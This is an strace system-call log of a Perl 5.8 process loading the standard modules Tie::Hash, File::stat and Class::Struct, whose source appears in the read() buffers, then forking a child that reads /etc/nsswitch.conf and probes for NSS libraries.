5839  07:10:58.201222 stat64("/etc/perl/Tie/Hash.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201293 stat64("/etc/perl/Tie/Hash.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201322 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201353 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201367 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201380 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201394 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201405 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201418 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201430 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201443 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201455 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201469 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.201482 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
5839  07:10:58.201503 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.201517 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.201528 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.201547 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
5839  07:10:58.201902 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
5839  07:10:58.202466 read(8, "", 4096) = 0
5839  07:10:58.202483 close(8)          = 0
5839  07:10:58.202514 stat64("/etc/perl/File/stat.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202529 stat64("/etc/perl/File/stat.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202543 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202556 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202570 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202582 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202596 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202608 stat64("/usr/lib/perl5/File/stat.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202621 stat64("/usr/share/perl5/File/stat.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202633 stat64("/usr/share/perl5/File/stat.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202647 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202659 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202673 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.202685 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
5839  07:10:58.202707 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.202732 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.202745 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.202783 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
5839  07:10:58.203195 stat64("/etc/perl/Class/Struct.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203213 stat64("/etc/perl/Class/Struct.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203266 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203294 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203308 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203321 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203335 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203347 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203360 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203372 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203385 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203402 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfe6096c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203416 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfe60a5c) = -1 ENOENT (No such file or directory)
5839  07:10:58.203429 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
5839  07:10:58.203451 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
5839  07:10:58.203465 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60778) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.203476 _llseek(10, 0, [0], SEEK_CUR) = 0
5839  07:10:58.203495 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
5839  07:10:58.203997 brk(0x82de000)    = 0x82de000
5839  07:10:58.204403 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
5839  07:10:58.205004 _llseek(10, 6916, [6916], SEEK_SET) = 0
5839  07:10:58.205021 _llseek(10, 0, [6916], SEEK_CUR) = 0
5839  07:10:58.205032 close(10)         = 0
5839  07:10:58.205205 _llseek(8, 1334, [1334], SEEK_SET) = 0
5839  07:10:58.205221 _llseek(8, 0, [1334], SEEK_CUR) = 0
5839  07:10:58.205231 close(8)          = 0
5839  07:10:58.205954 brk(0x82ff000)    = 0x82ff000
5839  07:10:58.206096 _llseek(6, 2689, [2689], SEEK_SET) = 0
5839  07:10:58.206112 _llseek(6, 0, [2689], SEEK_CUR) = 0
5839  07:10:58.206122 close(6)          = 0
5839  07:10:58.206270 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7de5908) = 5840
5840  07:10:58.206433 getppid()         = 5839
5840  07:10:58.206961 open("/etc/nsswitch.conf", O_RDONLY) = 6
5840  07:10:58.206984 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
5840  07:10:58.207003 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fab000
5840  07:10:58.207016 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
5840  07:10:58.207065 read(6, "", 4096) = 0
5840  07:10:58.207075 close(6)          = 0
5840  07:10:58.207085 munmap(0xb7fab000, 4096) = 0
5840  07:10:58.207112 open("/etc/ld.so.cache", O_RDONLY) = 6
5840  07:10:58.207125 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5840  07:10:58.207141 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7db2000
5840  07:10:58.207152 close(6)          = 0
5840  07:10:58.207163 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5840  07:10:58.207180 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207194 stat64("/lib/tls/i686/sse2/cmov", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207207 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207220 stat64("/lib/tls/i686/sse2", 0xbfe612fc) = -1 ENOENT (No such file or directory)
5840  07:10:58.207232 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
5840  07:10:58.207244 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
5840  07:10:58.207262 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
